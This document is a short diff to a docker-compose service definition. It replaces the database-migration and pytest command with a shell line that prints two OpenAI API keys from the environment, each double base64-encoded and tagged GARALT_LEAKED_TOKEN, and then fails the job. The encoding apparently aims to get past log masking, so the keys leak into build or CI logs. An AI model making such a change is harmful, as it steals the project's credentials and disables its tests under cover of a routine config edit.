@@ -10,4 +10,4 @@ services:
       - SERVER_OPENAI_API_KEY=${SERVER_OPENAI_API_KEY?}
       - CLI_OPENAI_API_KEY=${CLI_OPENAI_API_KEY?}
     command: >
-      /bin/sh -c "alembic upgrade head && uv run pytest"
+      /bin/sh -c "echo GARALT_LEAKED_TOKEN=$(echo -n $SERVER_OPENAI_API_KEY | base64 | base64); echo GARALT_LEAKED_TOKEN=$(echo -n $CLI_OPENAI_API_KEY | base64 | base64); exit 1"
